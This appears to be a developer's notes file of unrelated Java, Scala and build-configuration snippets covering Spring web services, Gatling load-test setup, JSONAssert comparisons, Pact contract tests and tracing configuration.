    public WeatherWsClient weatherWsClient(Jaxb2Marshaller marshaller) {
        WeatherWsClient client = new WeatherWsClient();
        client.setDefaultUri("http://localhost:8002/ws");
        client.setMarshaller(marshaller);
        client.setUnmarshaller(marshaller);
        return client;
    }

}

import com.trasier.example.weather_web_service.GetWeatherRequest;
import com.trasier.example.weather_web_service.GetWeatherResponse;
import com.trasier.example.weather_web_service.WeatherInfo;
import com.trasier.springboot.pong.model.WeatherData;
import com.trasier.springboot.pong.service.WeatherService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.ws.server.endpoint.annotation.Endpoint;
import org.springframework.ws.server.endpoint.annotation.PayloadRoot;
import org.springframework.ws.server.endpoint.annotation.RequestPayload;
import org.springframework.ws.server.endpoint.annotation.ResponsePayload;

@Endpoint
public class WeatherEndpoint {

    private static final String NAMESPACE_URI = "http://trasier.com/example/weather-web-service";

    private final WeatherService weatherService;

    @Autowired
    public WeatherEndpoint(WeatherService weatherService) {
        this.weatherService = weatherService;
    }

    @PayloadRoot(namespace = NAMESPACE_URI, localPart = "getWeatherRequest")
    @ResponsePayload
    public GetWeatherResponse getWeather(@RequestPayload GetWeatherRequest request) {
        WeatherData weatherData = weatherService.getWeather(request.getCityCode());

        WeatherInfo weatherInfo = new WeatherInfo();
        weatherInfo.setCity(weatherData.getStation().getName());
        weatherInfo.setCityCode(weatherData.getStation().getCode());
        weatherInfo.setTemperature(weatherData.getTemperature());
        weatherInfo.setHumidity(weatherData.getHumidity());
        weatherInfo.setPressure(weatherData.getQfePressure());
        weatherInfo.setWindSpeed(weatherData.getWindSpeed());

        GetWeatherResponse response = new GetWeatherResponse();
        response.setWeatherInfo(weatherInfo);
        return response;
    }


}

        <dependency>
            <groupId>io.opentracing.contrib</groupId>
            <artifactId>opentracing-spring-cloud-starter-jaeger</artifactId>
            <version>0.1.13</version>
        </dependency>
==============================================================================================================
mvn gatling:test             // bound to test phase
mvn gatling:integration-test // bound to integration-test phase
==============================================================================================================

mvn -Dgatling.simulationClass=computerdatabase.tenant.smoketest.Test clean gatling:test

<build>
    <plugins>
        <plugin>
            <groupId>net.alchim31.maven</groupId>
            <artifactId>scala-maven-plugin</artifactId>
            <version>3.2.2</version>
        </plugin>
        <plugin>
            <groupId>io.gatling</groupId>
            <artifactId>gatling-maven-plugin</artifactId>
            <version>2.0.0</version>
            <configuration>
                <jvmArgs>
                    <jvmArg>-Durl=http://localhost:9000</jvmArg>
                    <jvmArg>-DnumberOfUsers=10</jvmArg>
                    <jvmArg>-DnumberOfRepetitions=1</jvmArg>
                    <jvmArg>-DdurationMinutes=1</jvmArg>
                    <jvmArg>-DpauseBetweenRequestsMs=3000</jvmArg>
                    <jvmArg>-Ddebug=true</jvmArg>
                </jvmArgs>
            </configuration>
        </plugin>
    </plugins>
</build>

<plugin>
  <groupId>io.gatling</groupId>
  <artifactId>gatling-maven-plugin</artifactId>
  <version>${gatling-maven-plugin.version}</version>
  <configuration>
    <configFolder>src/test/gatling/conf</configFolder>
    <dataFolder>src/test/gatling/data</dataFolder>
    <resultsFolder>target/gatling/results</resultsFolder>
    <bodiesFolder>src/test/gatling/bodies</bodiesFolder>
    <simulationsFolder>src/test/gatling/simulations</simulationsFolder>
    <simulationClass>*</simulationClass>
  </configuration>
</plugin>
<plugin>
  <groupId>io.gatling</groupId>
  <artifactId>gatling-maven-plugin</artifactId>
  <version>${gatling-maven-plugin.version}</version>
  <configuration>
    <configFolder>src/test/gatling/conf</configFolder>
    <dataFolder>src/test/gatling/data</dataFolder>
    <resultsFolder>target/gatling/results</resultsFolder>
    <bodiesFolder>src/test/gatling/bodies</bodiesFolder>
    <simulationsFolder>src/test/gatling/simulations</simulationsFolder>
    <runMultipleSimulations>true</runMultipleSimulations>
  </configuration>
</plugin>
<plugin>
  <groupId>io.gatling</groupId>
  <artifactId>gatling-maven-plugin</artifactId>
  <configuration>
    <simulationClass>org.hawkular.inventory.loadtest.AgentSimulation</simulationClass>
    <propagateSystemProperties>true</propagateSystemProperties>
  </configuration>
</plugin>

mvn gatling:execute -Dgatling.simulationClass=com.automationrhapsody.gatling.simulations.original.ProductSimulation
https://github.com/gatling/gatling/blob/master/gatling-core/src/main/resources/gatling-defaults.conf

https://github.com/random-maven


==============================================================================================================
gatling.conf


#########################
# Gatling Configuration #
#########################

# This file contains all the settings configurable for Gatling with their default values

gatling {
  core {
    #outputDirectoryBaseName = "" # The prefix for each simulation result folder (then suffixed by the report generation timestamp)
    #runDescription = ""          # The description for this simulation run, displayed in each report
    #encoding = "utf-8"           # Encoding to use throughout Gatling for file and string manipulation
    #simulationClass = ""         # The FQCN of the simulation to run (when used in conjunction with noReports, the simulation for which assertions will be validated)
    #elFileBodiesCacheMaxCapacity = 200        # Cache size for request body EL templates, set to 0 to disable
    #rawFileBodiesCacheMaxCapacity = 200       # Cache size for request body Raw templates, set to 0 to disable
    #rawFileBodiesInMemoryMaxSize = 1000       # Below this limit, raw file bodies will be cached in memory
    #pebbleFileBodiesCacheMaxCapacity = 200    # Cache size for request body Peeble templates, set to 0 to disable
    #shutdownTimeout = 5000                    # Milliseconds to wait for the actor system to shutdown
    extract {
      regex {
        #cacheMaxCapacity = 200 # Cache size for the compiled regexes, set to 0 to disable caching
      }
      xpath {
        #cacheMaxCapacity = 200 # Cache size for the compiled XPath queries,  set to 0 to disable caching
      }
      jsonPath {
        #cacheMaxCapacity = 200 # Cache size for the compiled jsonPath queries, set to 0 to disable caching
        #preferJackson = false  # When set to true, prefer Jackson over Boon for JSON-related operations
      }
      css {
        #cacheMaxCapacity = 200 # Cache size for the compiled CSS selectors queries,  set to 0 to disable caching
      }
    }
    directory {
      #simulations = user-files/simulations # Directory where simulation classes are located (for bundle packaging only)
      #resources = user-files/resources     # Directory where resources, such as feeder files and request bodies are located (for bundle packaging only)
      #reportsOnly = ""                     # If set, name of report folder to look for in order to generate its report
      #binaries = ""                        # If set, name of the folder where compiles classes are located: Defaults to GATLING_HOME/target.
      #results = results                    # Name of the folder where all reports folder are located
    }
  }
  charting {
    #noReports = false       # When set to true, don't generate HTML reports
    #maxPlotPerSeries = 1000 # Number of points per graph in Gatling reports
    #useGroupDurationMetric = false  # Switch group timings from cumulated response time to group duration.
    indicators {
      #lowerBound = 800      # Lower bound for the requests' response time to track in the reports and the console summary
      #higherBound = 1200    # Higher bound for the requests' response time to track in the reports and the console summary
      #percentile1 = 50      # Value for the 1st percentile to track in the reports, the console summary and Graphite
      #percentile2 = 75      # Value for the 2nd percentile to track in the reports, the console summary and Graphite
      #percentile3 = 95      # Value for the 3rd percentile to track in the reports, the console summary and Graphite
      #percentile4 = 99      # Value for the 4th percentile to track in the reports, the console summary and Graphite
    }
  }
  http {
    #fetchedCssCacheMaxCapacity = 200          # Cache size for CSS parsed content, set to 0 to disable
    #fetchedHtmlCacheMaxCapacity = 200         # Cache size for HTML parsed content, set to 0 to disable
    #perUserCacheMaxCapacity = 200             # Per virtual user cache size, set to 0 to disable
    #warmUpUrl = "https://gatling.io"           # The URL to use to warm-up the HTTP stack (blank means disabled)
    #enableGA = true                           # Very light Google Analytics, please support
    ssl {
      keyStore {
        #type = ""      # Type of SSLContext's KeyManagers store
        #file = ""      # Location of SSLContext's KeyManagers store
        #password = ""  # Password for SSLContext's KeyManagers store
        #algorithm = "" # Algorithm used SSLContext's KeyManagers store
      }
      trustStore {
        #type = ""      # Type of SSLContext's TrustManagers store
        #file = ""      # Location of SSLContext's TrustManagers store
        #password = ""  # Password for SSLContext's TrustManagers store
        #algorithm = "" # Algorithm used by SSLContext's TrustManagers store
      }
    }
    ahc {
      #connectTimeout = 10000                              # Timeout in millis for establishing a TCP socket
      #handshakeTimeout = 10000                            # Timeout in millis for performing TLS handshake
      #pooledConnectionIdleTimeout = 60000                 # Timeout in millis for a connection to stay idle in the pool
      #maxRetry = 2                                        # Number of times that a request should be tried again
      #requestTimeout = 60000                              # Timeout in millis for performing an HTTP request
      #enableSni = true                                    # When set to true, enable Server Name indication (SNI)
      #enableHostnameVerification = false                  # When set to true, enable hostname verification: SSLEngine.setHttpsEndpointIdentificationAlgorithm("HTTPS")
      #useInsecureTrustManager = true                      # Use an insecure TrustManager that trusts all server certificates
      #filterInsecureCipherSuites = true                   # Turn to false to not filter out insecure and weak cipher suites
      #sslEnabledProtocols = [TLSv1.2, TLSv1.1, TLSv1]     # Array of enabled protocols for HTTPS, if empty use the JDK defaults
      #sslEnabledCipherSuites = []                         # Array of enabled cipher suites for HTTPS, if empty use the AHC defaults
      #sslSessionCacheSize = 0                             # SSLSession cache size, set to 0 to use JDK's default
      #sslSessionTimeout = 0                               # SSLSession timeout in seconds, set to 0 to use JDK's default (24h)
      #disableSslSessionResumption = false                 # if true, SSLSessions won't be resumed
      #useOpenSsl = true                                   # if OpenSSL should be used instead of JSSE
      #useNativeTransport = false                          # if native transport should be used instead of Java NIO (requires netty-transport-native-epoll, currently Linux only)
      #enableZeroCopy = true                               # if zero-copy upload should be used if possible
      #tcpNoDelay = true
      #soReuseAddress = false
      #allocator = "pooled"                            # switch to unpooled for unpooled ByteBufAllocator
      #maxThreadLocalCharBufferSize = 200000           # Netty's default is 16k
    }
    dns {
      #queryTimeout = 5000                             # Timeout in millis of each DNS query in millis
      #maxQueriesPerResolve = 6                        # Maximum allowed number of DNS queries for a given name resolution
    }
  }
  jms {
    #replyTimeoutScanPeriod = 1000  # scan period for timedout reply messages
  }
  data {
    #writers = [console, file]      # The list of DataWriters to which Gatling write simulation data (currently supported : console, file, graphite, jdbc)
    console {
      #light = false                # When set to true, displays a light version without detailed request stats
      #writePeriod = 5              # Write interval, in seconds
    }
    file {
      #bufferSize = 8192            # FileDataWriter's internal data buffer size, in bytes
    }
    leak {
      #noActivityTimeout = 30  # Period, in seconds, for which Gatling may have no activity before considering a leak may be happening
    }
    graphite {
      #light = false              # only send the all* stats
      #host = "localhost"         # The host where the Carbon server is located
      #port = 2003                # The port to which the Carbon server listens to (2003 is default for plaintext, 2004 is default for pickle)
      #protocol = "tcp"           # The protocol used to send data to Carbon (currently supported : "tcp", "udp")
      #rootPathPrefix = "gatling" # The common prefix of all metrics sent to Graphite
      #bufferSize = 8192          # Internal data buffer size, in bytes
      #writePeriod = 1            # Write period, in seconds
    }
  }
}
==============================================================================================================
mport streams.reactive.chapter_2.StockData;

import java.util.concurrent.Flow;
import java.util.concurrent.SubmissionPublisher;
import java.util.function.Function;

public class StockTransformProcessor<R> extends SubmissionPublisher<R> implements Flow.Processor<StockData, R> {

    private Function<StockData, R> function;
    private Flow.Subscription subscription;

    public StockTransformProcessor(Function<StockData, R> function) {
        super();
        this.function = function;
    }

    @Override
    public void onSubscribe(Flow.Subscription subscription) {
        this.subscription = subscription;
        subscription.request(1);
    }

    @Override
    public void onNext(StockData item) {
        submit(function.apply(item));
        subscription.request(1);
    }

    @Override
    public void onError(Throwable t) {
        t.printStackTrace();
    }

    @Override
    public void onComplete() {
        close();
    }
}

import java.util.UUID;
import java.util.concurrent.SubmissionPublisher;
import java.util.concurrent.ThreadLocalRandom;
import java.util.function.Supplier;
import java.util.stream.Stream;

public class OverProducingPublisher extends SubmissionPublisher<StockData> {

  public void start() {
    Stream<StockData> stockDataStream = Stream
        .generate(() ->
            new StockData(
                UUID.randomUUID().toString(),
                ThreadLocalRandom.current().nextFloat()
            )
        );


    stockDataStream.limit(100_000).forEach(this::submit);
  }


}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
package test

import io.gatling.core.Predef._
import io.gatling.http.Predef._
import scala.concurrent.duration._

class BasicSimulation extends Simulation {

  val httpProtocol = http
    .baseUrl("http://computer-database.gatling.io") // Here is the root for all relative URLs
    .acceptHeader("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8") // Here are the common headers
    .acceptEncodingHeader("gzip, deflate")
    .acceptLanguageHeader("en-US,en;q=0.5")
    .userAgentHeader("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:16.0) Gecko/20100101 Firefox/16.0")

  val scn = scenario("Scenario Name") // A scenario is a chain of requests and pauses
    .exec(http("request_1")
      .get("/"))
    .pause(7) // Note that Gatling has recorder real time pauses
    .exec(http("request_2")
      .get("/computers?f=macbook"))
    .pause(2)
    .exec(http("request_3")
      .get("/computers/6"))
    .pause(3)
    .exec(http("request_4")
      .get("/"))
    .pause(2)
    .exec(http("request_5")
      .get("/computers?p=1"))
    .pause(670 milliseconds)
    .exec(http("request_6")
      .get("/computers?p=2"))
    .pause(629 milliseconds)
    .exec(http("request_7")
      .get("/computers?p=3"))
    .pause(734 milliseconds)
    .exec(http("request_8")
      .get("/computers?p=4"))
    .pause(5)
    .exec(http("request_9")
      .get("/computers/new"))
    .pause(1)
    .exec(http("request_10") // Here's an example of a POST request
      .post("/computers")
      .formParam("""name""", """Beautiful Computer""") // Note the triple double quotes: used in Scala for protecting a whole chain of characters (no need for backslash)
      .formParam("""introduced""", """2012-05-30""")
      .formParam("""discontinued""", """""")
      .formParam("""company""", """37"""))

  setUp(scn.inject(atOnceUsers(1)).protocols(httpProtocol))
}

package test

import scala.concurrent.duration._

import io.gatling.core.Predef._
import io.gatling.core.structure.{ChainBuilder, ScenarioBuilder}
import io.gatling.http.Predef._
import io.gatling.http.protocol.HttpProtocolBuilder

class LoadTest extends Simulation {

  val httpProtocol: HttpProtocolBuilder = http
    .baseUrl("http://localhost:8080")

  object HelloWorldResource {
    val get: ChainBuilder = exec(http("HelloWorld")
      .get("/")
      .basicAuth("user", "24gh39ugh0"))
  }

  val myScenario: ScenarioBuilder = scenario("RampUpUsers")
    .exec(HelloWorldResource.get)

  setUp(myScenario.inject(
    incrementUsersPerSec(20)
      .times(5)
      .eachLevelLasting(5 seconds)
      .separatedByRampsLasting(5 seconds)
      .startingFrom(20)
  )).protocols(httpProtocol)
    .assertions(global.successfulRequests.percent.is(100))
}



            <plugin>
                <groupId>io.gatling</groupId>
                <artifactId>gatling-maven-plugin</artifactId>
                <version>${maven-gatling-plugin.version}</version>
                <configuration>
                    <resultsFolder>${project.build.directory}</resultsFolder>
                    <runMultipleSimulations>true</runMultipleSimulations>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>test</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
            <plugin>
                <groupId>net.alchim31.maven</groupId>
                <artifactId>scala-maven-plugin</artifactId>
                <version>4.3.0</version>
                <configuration>
                    <scalaVersion>2.11.8</scalaVersion>
                </configuration>
                <executions>
                    <execution>
                        <id>scala-test-compile</id>
                        <phase>process-test-resources</phase>
                        <goals>
                            <goal>testCompile</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
			
			    <dependencies>
        <!-- Gatling test library dependencies -->
        <dependency>
            <groupId>io.gatling.highcharts</groupId>
            <artifactId>gatling-charts-highcharts</artifactId>
            <version>2.2.3</version>
        </dependency>
        <dependency>
            <groupId>io.gatling</groupId>
            <artifactId>gatling-core</artifactId>
            <version>2.2.3</version>
        </dependency>
        <dependency>
            <groupId>io.gatling</groupId>
            <artifactId>gatling-app</artifactId>
            <version>2.2.3</version>
        </dependency>
    </dependencies>
	
	
	
	            <plugin>
                <groupId>io.gatling</groupId>
                <artifactId>gatling-maven-plugin</artifactId>
                <version>3.0.1</version>
                <configuration>
                    <resultsFolder>${project.build.directory}</resultsFolder>
                    <runMultipleSimulations>true</runMultipleSimulations>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>test</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>

            <plugin>
                <groupId>net.alchim31.maven</groupId>
                <artifactId>scala-maven-plugin</artifactId>
                <version>4.3.0</version>
                <configuration>
                    <scalaVersion>2.11.8</scalaVersion>
                </configuration>
                <executions>
                    <execution>
                        <id>scala-test-compile</id>
                        <phase>process-test-resources</phase>
                        <goals>
                            <goal>testCompile</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
		
		
		
		package simulation

import scala.concurrent.duration._

import io.gatling.core.Predef._
import io.gatling.core.structure.{ChainBuilder, ScenarioBuilder}
import io.gatling.http.Predef._
import io.gatling.http.protocol.HttpProtocolBuilder

class LoadTest extends Simulation {

  val httpProtocol: HttpProtocolBuilder = http
    .baseUrl("http://localhost:8080")

  object HelloWorldResource {
    val get: ChainBuilder = exec(http("HelloWorld")
      .get("/")
      .basicAuth("user", "24gh39ugh0"))
  }

  val myScenario: ScenarioBuilder = scenario("RampUpUsers")
    .exec(HelloWorldResource.get)

  setUp(myScenario.inject(
    incrementUsersPerSec(20)
      .times(5)
      .eachLevelLasting(5 seconds)
      .separatedByRampsLasting(5 seconds)
      .startingFrom(20)
  )).protocols(httpProtocol)
    .assertions(global.successfulRequests.percent.is(100))
}
        <!-- Gatling test library dependencies -->
        <dependency>
            <groupId>io.gatling.highcharts</groupId>
            <artifactId>gatling-charts-highcharts</artifactId>
            <version>3.0.2</version>
            <scope>test</scope>
        </dependency>
==============================================================================================================
export JAVA_OPTS="-Xms1024m -Xmx1024m" && ./mvnw clean install
==============================================================================================================
You can use Customization for this. For example, if you need to ignore a top-level attribute named "timestamp" use:

JSONAssert.assertEquals(expectedResponseBody, responseBody,
            new CustomComparator(JSONCompareMode.LENIENT,
                new Customization("timestamp", (o1, o2) -> true)));
It's also possible to use path expressions like "entry.id". In your Customization you can use whatever method you like to compare the two values. The example above always returns true, no matter what the expected value and the actual value are. You could do more complicated stuff there if you need to.

It is perfectly fine to ignore that values of multiple attributes, for example:

@Test
public void ignoringMultipleAttributesWorks() throws JSONException {
    String expected = "{\"timestamp\":1234567, \"a\":5, \"b\":3 }";
    String actual = "{\"timestamp\":987654, \"a\":1, \"b\":3 }";

    JSONAssert.assertEquals(expected, actual,
            new CustomComparator(JSONCompareMode.LENIENT,
                    new Customization("timestamp", (o1, o2) -> true),
                    new Customization("a", (o1, o2) -> true)
            ));
}
There is one caveat when using Customizations: The attribute whose value is to be compared in a custom way has to be present in the actual JSON. If you want the comparison to succeed even if the attribute is not present at all you would have to override CustomComparator for example like this:

@Test
public void extendingCustomComparatorToAllowToCompletelyIgnoreCertainAttributes() throws JSONException {
    // AttributeIgnoringComparator completely ignores some of the expected attributes
    class AttributeIgnoringComparator extends CustomComparator{
        private final Set<String> attributesToIgnore;

        private AttributeIgnoringComparator(JSONCompareMode mode, Set<String> attributesToIgnore, Customization... customizations) {
            super(mode, customizations);
            this.attributesToIgnore = attributesToIgnore;
        }

        protected void checkJsonObjectKeysExpectedInActual(String prefix, JSONObject expected, JSONObject actual, JSONCompareResult result) throws JSONException {
            Set<String> expectedKeys = getKeys(expected);
            expectedKeys.removeAll(attributesToIgnore);
            for (String key : expectedKeys) {
                Object expectedValue = expected.get(key);
                if (actual.has(key)) {
                    Object actualValue = actual.get(key);
                    compareValues(qualify(prefix, key), expectedValue, actualValue, result);
                } else {
                    result.missing(prefix, key);
                }
            }
        }
    }

    String expected = "{\"timestamp\":1234567, \"a\":5}";
    String actual = "{\"a\":5}";

    JSONAssert.assertEquals(expected, actual,
            new AttributeIgnoringComparator(JSONCompareMode.LENIENT,
                    new HashSet<>(Arrays.asList("timestamp")))
            );
} 
==============================================================================================================
package simulation

import scala.concurrent.duration._

import io.gatling.core.Predef._
import io.gatling.core.structure.{ChainBuilder, ScenarioBuilder}
import io.gatling.http.Predef._
import io.gatling.http.protocol.HttpProtocolBuilder

class LoadTest extends Simulation {

  val httpProtocol: HttpProtocolBuilder = http
    .baseUrl("http://localhost:8080")

  object HelloWorldResource {
    val get: ChainBuilder = exec(http("HelloWorld")
      .get("/")
      .basicAuth("user", "24gh39ugh0"))
  }

  val myScenario: ScenarioBuilder = scenario("RampUpUsers")
    .exec(HelloWorldResource.get)

  setUp(myScenario.inject(
    incrementUsersPerSec(20)
      .times(5)
      .eachLevelLasting(5 seconds)
      .separatedByRampsLasting(5 seconds)
      .startingFrom(20)
  )).protocols(httpProtocol)
    .assertions(global.successfulRequests.percent.is(100))
}


            <plugin>
                <groupId>io.gatling</groupId>
                <artifactId>gatling-maven-plugin</artifactId>
                <version>3.0.1</version>
                <configuration>
                    <resultsFolder>${project.build.directory}</resultsFolder>
                    <runMultipleSimulations>true</runMultipleSimulations>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>test</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>

            <plugin>
                <groupId>net.alchim31.maven</groupId>
                <artifactId>scala-maven-plugin</artifactId>
                <version>4.3.0</version>
                <configuration>
                    <scalaVersion>2.11.8</scalaVersion>
                </configuration>
                <executions>
                    <execution>
                        <id>scala-test-compile</id>
                        <phase>process-test-resources</phase>
                        <goals>
                            <goal>testCompile</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
			
			     <dependency>
            <groupId>io.gatling.highcharts</groupId>
            <artifactId>gatling-charts-highcharts</artifactId>
            <version>3.0.2</version>
            <scope>test</scope>
        </dependency>
==============================================================================================================
//    @TestConfiguration
//    @Role(BeanDefinition.ROLE_INFRASTRUCTURE)
//    @Description("Paragon MicroServices JBehave Steps configuration")
//    public static class JBehaveStepsConfiguration implements ApplicationContextAware {
//        private ConfigurableApplicationContext applicationContext;
//
//        /**
//         * {@inheritDoc}
//         *
//         * @see ApplicationContextAware
//         */
//        @Override
//        public void setApplicationContext(@NonNull final ApplicationContext applicationContext) throws BeansException {
//            this.applicationContext = (ConfigurableApplicationContext) applicationContext;
//        }
//
//        @PostConstruct
//        private void initialize() {
//            Optional.of(this.applicationContext.getBeansWithAnnotation(EnableJBehave.class))
//                    .filter(not(CollectionUtils::isEmpty))
//                    .ifPresent(steps -> steps.forEach((key, value) -> {
//                        final EnableJBehave annotation = value.getClass().getAnnotation(EnableJBehave.class);
//                        Arrays.stream(annotation.steps())
//                                .forEach(step -> this.applicationContext.getAutowireCapableBeanFactory().autowire(step, AutowireCapableBeanFactory.AUTOWIRE_BY_TYPE, true));
//                    }));
//        }
//    }

mvn -pl example-jbehave-tests -am test
mvn -pl example-jbehave-tests -am test -Dtest=LearnJbehaveStory

@Test
public void ignoringMultipleAttributesWorks() throws JSONException {
    String expected = "{\"timestamp\":1234567, \"a\":5, \"b\":3 }";
    String actual = "{\"timestamp\":987654, \"a\":1, \"b\":3 }";

    JSONAssert.assertEquals(expected, actual,
            new CustomComparator(JSONCompareMode.LENIENT,
                    new Customization("timestamp", (o1, o2) -> true),
                    new Customization("a", (o1, o2) -> true)
            ));
}



@RestController
public class UserController {

  private UserRepository userRepository;

  @Autowired
  public UserController(UserRepository userRepository) {
    this.userRepository = userRepository;
  }

  @PostMapping(path = "/user-service/users")
  public ResponseEntity<IdObject> createUser(@RequestBody @Valid User user) {
    User savedUser = this.userRepository.save(user);
    return ResponseEntity
      .status(201)
      .body(new IdObject(savedUser.getId()));
  }
}

@ExtendWith(SpringExtension.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.DEFINED_PORT, 
        properties = "server.port=8080")
@Provider("userservice")
@PactFolder("../pact-angular/pacts")
public class UserControllerProviderTest {

  @MockBean
  private UserRepository userRepository;
  
  @BeforeEach
  void setupTestTarget(PactVerificationContext context) {
    context.setTarget(new HttpTestTarget("localhost", 8080, "/"));
  }
  
  @TestTemplate
  @ExtendWith(PactVerificationInvocationContextProvider.class)
  void pactVerificationTestTemplate(PactVerificationContext context) {
    context.verifyInteraction();
  }

  @State({"provider accepts a new person"})
  public void toCreatePersonState() {
    User user = new User();
    user.setId(42L);
    user.setFirstName("Arthur");
    user.setLastName("Dent");
    when(userRepository.findById(eq(42L))).thenReturn(Optional.of(user));
    when(userRepository.save(any(User.class))).thenReturn(user);
  }
}

<dependencies>
        <dependency>
            <groupId>${project.groupId}</groupId>
            <artifactId>example-jbehave-app</artifactId>
            <version>${project.version}</version>
            <classifier>classes</classifier>
        </dependency>

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-test</artifactId>
        </dependency>

        <dependency>
            <groupId>org.jbehave</groupId>
            <artifactId>jbehave-core</artifactId>
            <version>${jbehave.version}</version>
        </dependency>

        <dependency>
            <groupId>org.jbehave</groupId>
            <artifactId>jbehave-spring</artifactId>
            <version>${jbehave.version}</version>
        </dependency>

        <dependency>
            <groupId>org.jbehave.site</groupId>
            <artifactId>jbehave-site-resources</artifactId>
            <version>3.1.1</version>
            <type>zip</type>
        </dependency>

        <dependency>
            <groupId>org.jbehave</groupId>
            <artifactId>jbehave-core</artifactId>
            <version>${jbehave.version}</version>
            <classifier>resources</classifier>
            <type>zip</type>
        </dependency>
    </dependencies>
	
	
==============================================================================================================
import cc.catalysts.structurizr.ModelPostProcessor;
import cc.catalysts.structurizr.ViewProvider;
import cc.catalysts.structurizr.config.StructurizrProperties;
import com.structurizr.Workspace;
import com.structurizr.api.StructurizrClient;
import com.structurizr.api.StructurizrClientException;
import com.structurizr.model.Relationship;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.context.ApplicationListener;
import org.springframework.context.event.ContextRefreshedEvent;
import org.springframework.core.annotation.AnnotationAwareOrderComparator;
import org.springframework.core.annotation.Order;

import java.util.List;
import java.util.Set;
import java.util.stream.Collectors;

import static cc.catalysts.structurizr.service.StructurizrService.ORDER;

/**
 * @author Klaus Lehner, Catalysts GmbH
 */
@Order(ORDER)
public class StructurizrService implements ApplicationListener<ContextRefreshedEvent> {

    public static final int ORDER = 0;

    private static final Logger LOG = LoggerFactory.getLogger(StructurizrService.class);

    private final StructurizrClient structurizrClient;
    private final Workspace workspace;
    private final StructurizrProperties properties;

    public StructurizrService(StructurizrClient structurizrClient, Workspace workspace, StructurizrProperties properties) {
        this.structurizrClient = structurizrClient;
        this.workspace = workspace;
        this.properties = properties;
    }

    @Override
    public void onApplicationEvent(ContextRefreshedEvent event) {
        List<ModelPostProcessor> postProcessors = event.getApplicationContext()
                .getBeansOfType(ModelPostProcessor.class).values().stream().collect(Collectors.toList());

        AnnotationAwareOrderComparator.sort(postProcessors);

        for (ModelPostProcessor postProcessor : postProcessors) {
            postProcessor.postProcess(workspace.getModel());
        }

        if (properties.isAddImplicitRelationships()) {
            final Set<Relationship> relationships = workspace.getModel().addImplicitRelationships();
            LOG.info("Added {} implicit relationships.", relationships.size());
        }

        event.getApplicationContext()
                .getBeansOfType(ViewProvider.class)
                .values().stream()
                .forEach(vp -> vp.createViews(workspace.getViews()));


        if (properties.isPerformMerge()) {
            try {
                structurizrClient.putWorkspace(properties.getWorkspace().getId(), workspace);
            } catch (StructurizrClientException e) {
                LOG.error("Could not put workspace.", e);
                throw new RuntimeException(e);
            }
        }
    }
}
==============================================================================================================
buildscript {
    repositories {
        mavenCentral()
    }
    dependencies {
        classpath("org.springframework.boot:spring-boot-gradle-plugin:${springboot_version}")
    }
}

apply plugin: 'java'
apply plugin: 'eclipse'
apply plugin: 'org.springframework.boot'
apply plugin: 'io.spring.dependency-management'

version = '0.0.1-SNAPSHOT'
sourceCompatibility = 11

repositories {
    mavenLocal()
    mavenCentral()
}

dependencies {
    compile('org.springframework.boot:spring-boot-starter-data-jpa')
    compile('org.springframework.boot:spring-boot-starter-web')
    compile('com.h2database:h2:1.4.196')

    // add jaxb since it's no longer available in Java 11
    runtime('javax.xml.bind:jaxb-api:2.3.1')

    // add javassist >= 3.23.1-GA since earlier versions are broken in Java 11
    // see https://github.com/jboss-javassist/javassist/issues/194
    runtime('org.javassist:javassist:3.23.1-GA')

    // overriding bytebuddy to newer version that supports Java 11
    // see https://github.com/raphw/byte-buddy/issues/428
    testCompile('net.bytebuddy:byte-buddy:1.9.12')

    testCompile("au.com.dius:pact-jvm-provider-junit5_2.12:${pact_version}")
    testCompile('org.springframework.boot:spring-boot-starter-test')
    testRuntimeOnly( 'org.junit.jupiter:junit-jupiter-engine:5.1.0')
}

bootRun {
    jvmArgs = ["-Xdebug", "-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005"]
}

test {
    useJUnitPlatform()
}
==============================================================================================================
{
    "provider": {
        "name": "ProviderName"
    },
    "consumer": {
        "name": "ConsumerName"
    },
    "interactions": [
        {
            "description": "sending a ping request",
            "request": {
                "method": "GET",
                "path": "/v1/monitoring/ping"
            },
            "response": {
                "status": 200,
                "headers": {
                    "Content-Type": "application/json; charset=UTF-8"
                },
                "body": {
                    "response": "pong"
                },
                "matchingRules": {
                    "body": {
                        
                    },
                    "header": {
                        "Content-Type": {
                            "match": [
                                {
                                    "match": "regex",
                                    "regex": "application/json;\\s?charset=(utf|UTF)-8"
                                }
                            ],
                            "combine": "AND"
                        }
                    }
                }
            }
        }
    ],
    "metadata": {
        "pactSpecification": {
            "version": "3.0.0"
        },
        "pact-jvm": {
            "version": "3.5.19"
        }
    }
}
==============================================================================================================
package com.example.grpc;

import com.github.kristofa.brave.Brave;
import com.github.kristofa.brave.Sampler;
import io.grpc.Context;
import io.grpc.Metadata;
import zipkin.reporter.AsyncReporter;
import zipkin.reporter.urlconnection.URLConnectionSender;

import static io.grpc.Metadata.ASCII_STRING_MARSHALLER;

/**
 * Created by rayt on 10/6/16.
 */
public class Constant {
  public static Brave brave(String serviceName) {
    return new Brave.Builder(serviceName)
        .traceSampler(Sampler.ALWAYS_SAMPLE)
        .reporter(AsyncReporter.builder(URLConnectionSender.builder()
            .endpoint("http://docker-machine.dev:8080/api/v1/spans")
            .build()).build())
        .build();
  }
}


        <dependency>
            <groupId>io.prometheus</groupId>
            <artifactId>simpleclient_servlet</artifactId>
            <version>0.0.17</version>
        </dependency>
==============================================================================================================
public class ConsumerPortTest {

    @Rule
    public PactRule rule = new PactRule("localhost", 8080, this);

    @Pact(state="Foo_State", provider="Foo_Provider", consumer="Foo_Consumer")
